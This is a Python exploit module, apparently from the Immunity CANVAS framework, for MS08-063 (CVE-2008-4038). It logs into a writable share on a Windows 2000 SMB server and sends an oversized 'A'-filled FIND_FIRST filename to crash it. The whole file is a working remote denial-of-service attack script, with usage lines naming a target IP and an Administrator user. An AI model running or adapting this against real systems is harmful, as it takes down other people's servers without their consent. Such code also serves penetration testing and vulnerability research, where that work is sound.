#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
import socket
from libs.newsmb.libsmb import SMBClient, SMBClientException


# GUI info
NAME='Windows SMB Server Overflow'
DESCRIPTION='Windows SMB Server Overflow'
VERSION='1.0'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='10/14/08'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS08-063.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name']='CVE-2008-4038'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4038'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['NOTES']='To exploit this DoS you need access to a share on the target machine with write access.'
PROPERTY={}
PROPERTY['TYPE']='DoS'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000']
PROPERTY['MSADV']='MS08-063'

NOTES="""
Usage:
./exploits/ms08_063/ms08_063.py -t 10.10.10.243 -O user:Administrator -l 1.1.1.1 -d 1 -O share:Shared
"""

CHANGELOG="""
"""

targets={
    0:['Autodetect',0],
    1:['Windows 2000 (DoS)',0x42424242]
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port      = 139
        self.host      = ''
        self.shellcode = ''
        self.badstring = '\0'
        self.version   = 1
        self.name      = NAME        
        self.user      = u''
        self.password  = u''
        self.share     = u'C$'
        self.needsNoShellcode=1

    def neededListenerTypes(self):
        return []

    def getsocket(self):
        if ':' in self.host:
            return self.gettcpsock(AF_INET6=1)
        else:
            return self.gettcpsock()
        
    def test(self):
        self.getargs()
        s = self.getsocket()
        try:
            s.connect((self.host, self.port))
        except:
            self.log('No connection could be established')
            return 0
        return 1
    
    def getargs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port', self.port))
        self.user = self.getarg('user')
        self.password = self.getarg('password')
        self.share = self.getarg('share')
        return 
    
    def run(self):
        self.getargs()        
        self.setInfo('%s attacking %s:%d (in progress)' % (NAME, self.host, self.port))
        s = self.getsocket()
        sockaddr = (self.host, self.port)
        connected = False
        try:
            s.connect(sockaddr)
            connected = True
        except:
            self.log('Could not connect to: %s:%d' % sockaddr)

        if not connected:
            self.setInfo('%s attacking %s:%d - done (failed)' % (NAME, self.host, self.port))
            return 0

        my_smb = SMBClient(s, username=self.user, password=self.password)

        try:
            my_smb.negotiate()
            my_smb.session_setup()
            my_smb.tree_connect(self.share)
            attackstring = 'A' * 0x800
            my_smb.find_first(filename=attackstring, response=False)
        except SMBClientException, ex:
            self.log('SMB Error: %s' % ex)
            return 0

        self.setSucceeded()
        self.setInfo('%s attacking %s:%d - done (success!)' % (NAME, self.host, self.port))
        return 1

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i=i+1

    def usage(self):
        print 'Usage: %s -v version -t host\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
